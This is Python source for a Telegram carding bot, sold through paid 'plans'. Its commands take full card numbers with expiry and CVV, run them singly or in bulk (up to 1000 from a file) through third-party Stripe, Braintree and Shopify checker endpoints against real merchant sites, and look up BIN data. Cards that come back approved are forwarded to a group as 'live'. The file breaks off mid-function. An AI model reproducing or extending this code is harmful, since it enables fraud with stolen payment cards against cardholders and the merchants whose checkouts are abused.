import re
import html
import requests
import json
import os
import time
from telegram import InputFile
from telegram.ext import CallbackQueryHandler
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, CallbackContext, MessageHandler, Filters
import random
from config import LIVE_GROUP_ID


FORWARD_GROUP_ID = -4821387542

APPROVED_KEYWORDS = [
    "INSUFFICIENT_FUNDS", "Thank You", "Thank you for your purchase",
    "Your order is confirmed"
]
        

# File paths
PLAN_FILE = "Data/plan.json"
KEYS_FILE = "Data/Keys.json"
SITE_FILE = "Data/sites.json"  



ADMIN_USERNAME = "@HACXIE"  
# API and BIN source
API_URL = "http://194.238.22.129:8080/b3?cc="
BIN_URL = "https://bins.antipublic.cc/bins/"
BRAINTREE_API = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=pixelpixiedesigns.com/cc="
BIN_LOOKUP = "https://bins.antipublic.cc/bins/"
STRIPE_URL = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=pixelpixiedesigns.com/cc="
SH_URL = "http://kamalxd.com/Dark/shp.php"
SHOPIFY_API = "http://kamalxd.com/Dark/shp.php"

# Ensure JSON files exist
os.makedirs("Data", exist_ok=True)
for f in [PLAN_FILE, KEYS_FILE]:
    if not os.path.exists(f):
        with open(f, "w") as file:
            json.dump({}, file)

# Helper functions
def load_json(path):
    with open(path) as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
        

        
        
def forward_live_card(bot, response_text):
    try:
        bot.send_message(chat_id=LIVE_GROUP_ID, text=response_text, parse_mode="Markdown")
    except Exception as e:
        print(f"[⚠️] Failed to forward live card: {e}")

def extract_cc(text):
    pattern = r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})"
    match = re.search(pattern, text)
    if match:
        cc, mm, yy, cvv = match.groups()
        yy = yy[-2:] if len(yy) == 4 else yy
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None
    


def has_active_plan(user_id):
    plans = load_json(PLAN_FILE)
    plan = plans.get(str(user_id))
    if not plan:
        return False
    expiry = datetime.strptime(plan['expiry'], "%Y-%m-%d")
    return expiry >= datetime.today()


KEY_FILE = "Data/Keys.json"


def mre_command(update: Update, context: CallbackContext):
    msg = update.message
    user_id = str(msg.from_user.id)
    name = msg.from_user.first_name
    args = msg.text.split()
    if len(args) != 2:
        return msg.reply_text("[↯] 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑭𝑶𝑹𝑴𝑨𝑻 \n\n[↯] 𝑼𝑺𝑨𝑮𝑬 ↯ /mre 𝒀𝑶𝑼𝑹 𝑲𝑬𝒀 𝑯𝑬𝑹𝑬\n\n━━━━━━━━━━━━━━━━━━━━")

    key = args[1].strip()
    keys = load_json(KEY_FILE)
    plans = load_json(PLAN_FILE)

    if key not in keys:
        return msg.reply_text("[↯] 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵 𝑨𝑪𝑻𝑰𝑽𝑨𝑻𝑰𝑶𝑵 𝑭𝑨𝑰𝑳𝑬𝑫 \n\n[↯] 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 ❌\n[↯] 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑲𝑬𝒀\n\n━━━━━━━━━━━━━━━━━━━━")
    if keys[key]["used"]:
        return msg.reply_text("[↯] 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵 𝑨𝑪𝑻𝑰𝑽𝑨𝑻𝑰𝑶𝑵 𝑭𝑨𝑰𝑳𝑬𝑫 \n\n[↯] 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 ❌\n[↯] 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑲𝑬𝒀 𝑨𝑳𝑹𝑬𝑨𝑫𝒀 𝑼𝑺𝑬𝑫\n\n━━━━━━━━━━━━━━━━━━━━")

    duration_minutes = keys[key]["duration"]
    expiry_time = datetime.now() + timedelta(minutes=duration_minutes)
    plans[user_id] = {
        "name": name,
        "expiry": expiry_time.strftime("%Y-%m-%d %H:%M:%S")
    }

    keys[key]["used"] = True

    save_json(PLAN_FILE, plans)
    save_json(KEY_FILE, keys)

    msg.reply_text(
        f"[↯] 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵 𝑨𝑪𝑻𝑰𝑽𝑨𝑻𝑬𝑫\n\n"
        f"[↯] 𝑼𝑺𝑬𝑹  ↯ {name}\n"
        f"[↯] 𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 ↯ {duration_minutes} minutes\n"
        f"[↯] 𝑬𝑿𝑷𝑰𝑹𝒀  ↯ {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    
# /redeem command
def redeem_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)

    if len(context.args) != 1:
        update.message.reply_text("[↯] 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑭𝑶𝑹𝑴𝑨𝑻 \n\n[↯] 𝑼𝑺𝑨𝑮𝑬 ↯ /𝒓𝒆𝒅𝒆𝒆𝒎 𝒀𝑶𝑼𝑹 𝑲𝑬𝒀 𝑯𝑬𝑹𝑬\n\n━━━━━━━━━━━━━━━━━━━━")
        return

    key_input = context.args[0].strip().upper()
    keys = load_json(KEYS_FILE)
    plans = load_json(PLAN_FILE)

    if key_input not in keys:
        update.message.reply_text(
        f"[↯] 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵 𝑨𝑪𝑻𝑰𝑽𝑨𝑻𝑰𝑶𝑵 𝑭𝑨𝑰𝑳𝑬𝑫 \n\n"
        f"[↯] 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 ❌\n"
        f"[↯] 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑲𝑬𝒀\n\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
        return

    if keys[key_input]["used"]:
        update.message.reply_text("[↯] 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵 𝑨𝑪𝑻𝑰𝑽𝑨𝑻𝑰𝑶𝑵 𝑭𝑨𝑰𝑳𝑬𝑫 \n\n[↯] 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 ❌\n[↯] 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑲𝑬𝒀 𝑨𝑳𝑹𝑬𝑨𝑫𝒀 𝑼𝑺𝑬𝑫\n\n━━━━━━━━━━━━━━━━━━━━")
        return

    # Valid key logic
    days = keys[key_input]["days"]
    expiry_date = (datetime.today() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    plans[user_id] = {
        "days": days,
        "activated": datetime.today().strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry_date
    }
    save_json(PLAN_FILE, plans)

    keys[key_input]["used"] = True
    save_json(KEYS_FILE, keys)

    update.message.reply_text(
        f"[↯] 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵 𝑨𝑪𝑻𝑰𝑽𝑨𝑻𝑬𝑫 \n\n"
        f"[↯] 𝑼𝑺𝑬𝑹  ↯ {user_id}\n"
        f"[↯] 𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 ↯ {days} Days\n"
        f"[↯] 𝑬𝑿𝑷𝑰𝑹𝒀  ↯ {expiry_date}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
def b3_command(update: Update, context: CallbackContext):

    msg = update.message
    user = msg.from_user
    user_id = str(user.id)
    text = msg.text or (msg.reply_to_message.text if msg.reply_to_message else "")
    cc = extract_cc(text)
    
    if not has_active_plan(user_id):
        msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦\n\n"
            "✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌  \n"
            "✦ 𝑷𝑳𝑨𝑵   ↯ 𝑵𝑶𝑵𝑬  \n"
            "✦ 𝑬𝑿𝑷𝑰𝑹𝒀  ↯ 𝑵/𝑨\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⟡ 𝑩𝑼𝒀 𝑵𝑶𝑾 ⟡  ", url="https://t.me/hacxie")]
            ])
        )
        return

    if not cc:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑪𝑨𝑹𝑫 𝑭𝑶𝑹𝑴𝑨𝑻\n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /b3 cc|mm|yy|cvv\n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/b3 5154620057263731|04|29|674`\n━━━━━━━━━━━━━━━━━━━\n", parse_mode="Markdown")
        return

    processing = msg.reply_text(
        "━━━━━━━━━━━━━━━━━━━\n"
        "[↯] 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺  \n\n"
        "[↯] 𝑺𝒕𝒂𝒕𝒖𝒔 ↯ 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 ∎∎∎□□  \n"
        "[↯] 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒕𝒉𝒊𝒔 𝒎𝒂𝒚 𝒕𝒂𝒌𝒆 𝒔𝒐𝒎𝒆 𝒕𝒊𝒎𝒆...  \n"
        "[↯] 𝑮𝑨𝑻𝑬 ↯ 𝑩𝑹𝑨𝑰𝑵𝑻𝑹𝑬𝑬 𝑨𝑼𝑻𝑯  \n"
        "━━━━━━━━━━━━━━━━━━━"
    )

    start = time.time()

    try:
        result = requests.get(API_URL + cc, timeout=30).json()
    except Exception as e:
        processing.edit_text(f"✦ Error connecting to API: {e}")

    try:
        bin_data = requests.get(BIN_URL + cc[:6], timeout=10).json()
        bin_info = {
            "bank": bin_data.get("bank", "N/A"),
            "brand": f"{bin_data.get('type','N/A')} - {bin_data.get('category','N/A')} - {bin_data.get('scheme','N/A')}",
            "level": bin_data.get("level", "N/A"),
            "country": bin_data.get("country_name", "N/A"),
            "currency": bin_data.get("currency", "N/A")
        }
    except:
        bin_info = {
            "bank": "N/A", "brand": "N/A", "level": "N/A", "country": "N/A", "currency": "N/A"
        }

    status = "𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ✅" if result.get("success") else "𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ❌"
    reason = result.get("message", "No response")

    check_time = time.time() - start
    delay = 20
    time.sleep(delay)
    total_time = round(check_time + delay, 2)

    final = (
        f"━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗖𝗖 ↯ {cc}\n"
        f"[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ↯ 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵\n"
        f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧 ↯ {status}\n"
        f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ↯{reason}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗕𝗮𝗻𝗸 ↯ {bin_info['bank']}\n"
        f"[↯] 𝗕𝗿𝗮𝗻𝗱 ↯ {bin_info['brand']}\n"
        f"[↯] 𝗟𝗲𝘃𝗲𝗹 ↯ {bin_info['level']}\n"
        f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ {bin_info['country']}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗧𝗶𝗺𝗲 ↯ {total_time}s\n"
        f"[↯] 𝗨𝘀𝗲𝗿 ↯ {user.first_name}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    processing.delete()
    msg.reply_text(final, reply_to_message_id=msg.message_id)

    # Forward if approved
    if result.get("success"):
        forward_live_card(context.bot, final)


def extracts_cc(text):
    match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", text)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    yy = yy[-2:] if len(yy) == 4 else yy
    return f"{cc}|{mm}|{yy}|{cvv}"
    

def chk_command(update, context):
    msg = update.message
    user = msg.from_user
    text = msg.text or (msg.reply_to_message.text if msg.reply_to_message else "")
    cc = extracts_cc(text)

    if not cc:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑪𝑨𝑹𝑫 𝑭𝑶𝑹𝑴𝑨𝑻\n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /chk cc|mm|yy|cvv\n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/chk 5154620057263731|04|29|674`\n━━━━━━━━━━━━━━━━━━━", parse_mode="Markdown")
        return

    start = time.time()
    wait_msg = msg.reply_text(
        "━━━━━━━━━━━━━━━━━━━\n"
        "[↯] 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺  \n\n"
        "[↯] 𝑺𝒕𝒂𝒕𝒖𝒔 ↯ 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 ∎∎∎□□  \n"
        "[↯] 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒕𝒉𝒊𝒔 𝒎𝒂𝒚 𝒕𝒂𝒌𝒆 𝒔𝒐𝒎𝒆 𝒕𝒊𝒎𝒆...  \n"
        "[↯] 𝑮𝑨𝑻𝑬 ↯ 𝑺𝑻𝑹𝑰𝑷𝑬 𝑨𝑼𝑻𝑯  \n"
        "━━━━━━━━━━━━━━━━━━━"
    )

    try:
        r = requests.get(BRAINTREE_API + cc, timeout=20)
        res = r.json()
        reason = res.get("response", "Unknown").replace('"', '')
        status_text = res.get("status", "").lower()
        is_approved = "approved" in status_text
    except Exception as e:
        wait_msg.edit_text(f"✦ API Error: {e}")
        return

    try:
        bin_data = requests.get(BIN_LOOKUP + cc[:6], timeout=10).json()
        bank = bin_data.get("bank", "N/A")
        brand = bin_data.get("brand", "N/A")
        ctype = bin_data.get("type", "N/A")
        level = bin_data.get("level", "N/A")
        country = bin_data.get("country_name", "N/A")
    except:
        bank = brand = ctype = level = country = "N/A"

    duration = round(time.time() - start, 2)
    result = "𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ✅" if is_approved else "𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ❌"

    final = (
        f"━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗖𝗖 ↯  {cc}\n"
        f"[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ↯ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n"
        f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧 ↯ {result}\n"
        f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ↯ {reason}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗕𝗮𝗻𝗸 ↯ {bank}\n"
        f"[↯] 𝗕𝗿𝗮𝗻𝗱 ↯ {brand} - {ctype} - {brand}\n"
        f"[↯] 𝗟𝗲𝘃𝗲𝗹 ↯ {level}\n"
        f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ {country}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗧𝗶𝗺𝗲 ↯ {duration}s\n"
        f"[↯] 𝗨𝘀𝗲𝗿 ↯ {user.first_name}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
    )
    wait_msg.delete()
    msg.reply_text(final, reply_to_message_id=msg.message_id)

    if is_approved:
        forward_live_card(context.bot, final)
        


# Utility to extract CCs
def extract_ccs(text):
    return re.findall(r"\d{12,16}[|:\s]?\d{1,2}[|:\s]?\d{2,4}[|:\s]?\d{3,4}", text)

# Check active plan function
def has_active_plans(user_id):
    try:
        with open("Data/plan.json") as f:
            plans = json.load(f)
        expiry = plans.get(str(user_id), {}).get("expiry")
        if not expiry:
            return False
        return datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S") > datetime.now()
    except:
        return False


# /mchk command
def mchk_command(update, context):
    msg = update.message
    user = msg.from_user
    user_id = user.id
    name = user.full_name

    if not has_active_plans(user_id):
        return msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦\n\n"
            "✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌  \n"
            "✦ 𝑷𝑳𝑨𝑵   ↯ 𝑵𝑶𝑵𝑬  \n"
            "✦ 𝑬𝑿𝑷𝑰𝑹𝒀  ↯ 𝑵/𝑨\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⟡ 𝑩𝑼𝒀 𝑵𝑶𝑾 ⟡", url="https://t.me/hacxie")]
            ])
        )

    # File reply check
    if not msg.reply_to_message or not msg.reply_to_message.document:
        return msg.reply_text("✦ 𝑴𝑨𝑺𝑺 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ Please reply to a `.txt` file with `/mchk` command.", parse_mode="Markdown")

    file = context.bot.get_file(msg.reply_to_message.document.file_id)
    file_path = f"temp_{user_id}.txt"
    file.download(file_path)

    with open(file_path, "r") as f:
        content = f.read()
    os.remove(file_path)

    ccs = extract_ccs(content)
    if not ccs:
        return msg.reply_text("⟡ No valid CCs found in file.")

    limit = min(1000, len(ccs))
    selected = ccs[:limit]

    wait_msg = msg.reply_text(
        f"✦ 𝑴𝑨𝑺𝑺 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ✦\n\n"
        f"⟡ 𝑻𝑶𝑻𝑨𝑳  ↯ {len(ccs)}\n"
        f"⟡ 𝑪𝑯𝑬𝑪𝑲𝑰𝑵𝑮 ↯ {limit} (𝑳𝑰𝑴𝑰𝑻: 100)\n"
        f"⟡ 𝑮𝑨𝑻𝑬   ↯ 𝑺𝑻𝑹𝑰𝑷𝑬 𝑨𝑼𝑻𝑯\n"
        f"⟡ 𝑷𝑳𝑬𝑨𝑺𝑬 𝑾𝑨𝑰𝑻...\n━━━━━━━━━━━━━━━━━━━"
    )

    approved = declined = 0
    result_lines = []
    start_time = time.time()

    for cc in selected:
        try:
            r = requests.get(BRAINTREE_API + cc, timeout=30)
            result = r.json()
            status = result.get("status", "Declined ❌")
            reason = result.get("response", "Unknown")

            is_live = "APPROVED" in status.upper() or "LIVE" in reason.upper()
            if is_live:
                approved += 1
            else:
                declined += 1
        except Exception as e:
            status = "Error"
            reason = str(e)
            declined += 1
        result_lines.append(f"{cc}|{status}|{reason}")

    duration = round(time.time() - start_time, 2)
    final_path = f"Stripe_{user_id}.txt"
    with open(final_path, "w") as f:
        f.write("\n".join(result_lines))

    with open(final_path, "rb") as f:
        context.bot.send_document(
            chat_id=msg.chat_id,
            document=InputFile(f, filename="Checked_CCs.txt"),
            caption=(
                f"✦ 𝑴𝑨𝑺𝑺 𝑪𝑯𝑬𝑪𝑲 𝑹𝑬𝑺𝑼𝑳𝑻 ✦\n\n"
                f"⟡ 𝑻𝑶𝑻𝑨𝑳   ↯ {limit}\n"
                f"⟡ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ↯ {approved}\n"
                f"⟡ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫  ↯ {declined}\n"
                f"⟡ 𝑻𝑰𝑴𝑬 ↯ {duration}s\n"
                f"⟡ 𝑮𝑨𝑻𝑬   ↯ 𝑺𝑻𝑹𝑰𝑷𝑬 𝑨𝑼𝑻𝑯\n"
                f"⟡ 𝑪𝑯𝑬𝑪𝑲𝑬𝑫 𝑩𝒀 ↯ {name}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
        )

    wait_msg.delete()
    os.remove(final_path)




def has_active_plan(user_id):
    try:
        with open(PLAN_FILE) as f:
            plans = json.load(f)
        if user_id not in plans:
            return False
        return True
    except:
        return False
        
        
APPROVED_KEYWORDS = [
    "INSUFFICIENT_FUNDS", "Thank You", "Thank you for your purchase",
    "Your order is confirmed"
]

def is_active(user_id):
    try:
        with open("Data/plan.json") as f:
            plans = json.load(f)
        return str(user_id) in plans
    except:
        return False

def get_user_plan(user_id):
    with open("Data/plan.json") as f:
        plans = json.load(f)
    if str(user_id) in plans:
        return plans[str(user_id)]
    return None


def sh_cc(text):
    pattern = r'(?:\d{12,16})\|(?:0?[1-9]|1[0-2])\|(?:\d{2,4})\|(?:\d{3,4})'
    match = re.search(pattern, text)
    return match.group(0) if match else None
    



def sf_command(update: Update, context: CallbackContext):
    msg = update.message

    user_id = msg.from_user.id
    name = msg.from_user.first_name
    cc_text = msg.text or (msg.reply_to_message.text if msg.reply_to_message else "")
    cc = sh_cc(cc_text)
    
    if not is_active(user_id):
        buttons = [[InlineKeyboardButton("⟡ 𝑩𝑼𝒀 𝑵𝑶𝑾", url="https://t.me/hacxie")]]
        msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦\n\n"
            "✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌  \n"
            "✦ 𝑷𝑳𝑨𝑵   ↯ 𝑵𝑶𝑵𝑬  \n"
            "✦ 𝑬𝑿𝑷𝑰𝑹𝒀  ↯ 𝑵/𝑨\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

    if not cc:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑪𝑨𝑹𝑫 𝑭𝑶𝑹𝑴𝑨𝑻\n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /sf cc|mm|yy|cvv\n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/sf 5154620057263731|04|29|674`\n━━━━━━━━━━━━━━━━━━━\n", parse_mode="Markdown")
        return

    processing_msg = msg.reply_text(
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺\n\n"
        f"[↯] 𝑪𝑪 ↯ {cc}\n"
        f"[↯] 𝑺𝒕𝒂𝒕𝒖𝒔 ↯ 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 ∎∎∎□□  \n"
        f"[↯] 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒕𝒉𝒊𝒔 𝒎𝒂𝒚 𝒕𝒂𝒌𝒆 𝒔𝒐𝒎𝒆 𝒕𝒊𝒎𝒆...  \n"
        f"[↯] 𝑮𝑨𝑻𝑬 ↯ 𝑺𝑯𝑶𝑷𝑰𝑭𝒀  \n"
        f"[↯] 𝑨𝑴𝑶𝑼𝑵𝑻 ↯ 3.49$  \n"
        f"━━━━━━━━━━━━━━━━━━━",
        reply_to_message_id=msg.message_id
    )

    start_time = time.time()
    try:
        api_url = f"{SH_URL}?cc={cc}&site=https://beautiful-you-brianna.myshopify.com"
        response = requests.get(api_url, timeout=30).json()

        cc_val = response.get("cc", cc)
        gateway = response.get("Gateway", "N/A")
        result = response.get("Response", "N/A")
        price = response.get("Price", "N/A")

        result_status = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" if any(k.lower() in result.lower() for k in APPROVED_KEYWORDS) else "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"

        # BIN lookup
        bin_data = requests.get(f"{BIN_URL}{cc[:6]}", timeout=10).json()
        bank = bin_data.get("bank", "N/A")
        brand = f"{bin_data.get('brand', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('brand', 'N/A')}"
        level = bin_data.get("level", "N/A")
        country = bin_data.get("country_name", "N/A")
        currency = ', '.join(bin_data.get("country_currencies", ["N/A"]))

        taken = f"{time.time() - start_time:.2f}s"

        final_msg = (
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗖𝗖 ↯ {cc_val}\n"
            f"[↯] 𝗚𝗔𝗧𝗘𝗦 ↯ {gateway} : {price}💲\n"
            f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧 ↯ {result_status}\n"
            f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ↯ {result}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗕𝗮𝗻𝗸 ↯ {bank}\n"
            f"[↯] 𝗕𝗿𝗮𝗻𝗱 ↯ {brand}\n"
            f"[↯] 𝗟𝗲𝘃𝗲𝗹 ↯ {level}\n"
            f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ {country}\n"
            f"[↯] 𝗖𝘂𝗿𝗿𝗲𝗻𝘤𝘆 ↯ {currency}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗧𝗶𝗺𝗲 ↯ {taken}\n"
            f"[↯] 𝗨𝘀𝗲𝗿 ↯ {name}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )

        processing_msg.delete()
        msg.reply_text(final_msg, reply_to_message_id=msg.message_id)

        if "approved" in result.lower() or any(k.lower() in result.lower() for k in APPROVED_KEYWORDS):
            forward_live_card(context.bot, final_msg)

    except Exception as e:
        processing_msg.delete()
        msg.reply_text(f"❌ Error while checking card: {e}", reply_to_message_id=msg.message_id)
        




def sho_command(update: Update, context: CallbackContext):
    msg = update.message

    user_id = msg.from_user.id
    name = msg.from_user.first_name
    cc_text = msg.text or (msg.reply_to_message.text if msg.reply_to_message else "")
    cc = sh_cc(cc_text)
    
    if not is_active(user_id):
        buttons = [[InlineKeyboardButton("⟡ 𝑩𝑼𝒀 𝑵𝑶𝑾", url="https://t.me/hacxie")]]
        msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦\n\n"
            "✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌  \n"
            "✦ 𝑷𝑳𝑨𝑵   ↯ 𝑵𝑶𝑵𝑬  \n"
            "✦ 𝑬𝑿𝑷𝑰𝑹𝒀  ↯ 𝑵/𝑨\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

    if not cc:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑪𝑨𝑹𝑫 𝑭𝑶𝑹𝑴𝑨𝑻\n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /sho cc|mm|yy|cvv\n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/sho 5154620057263731|04|29|674`\n━━━━━━━━━━━━━━━━━━━\n", parse_mode="Markdown")
        return

    processing_msg = msg.reply_text(
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺\n\n"
        f"[↯] 𝑪𝑪 ↯ {cc}\n"
        f"[↯] 𝑺𝒕𝒂𝒕𝒖𝒔 ↯ 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 ∎∎∎□□  \n"
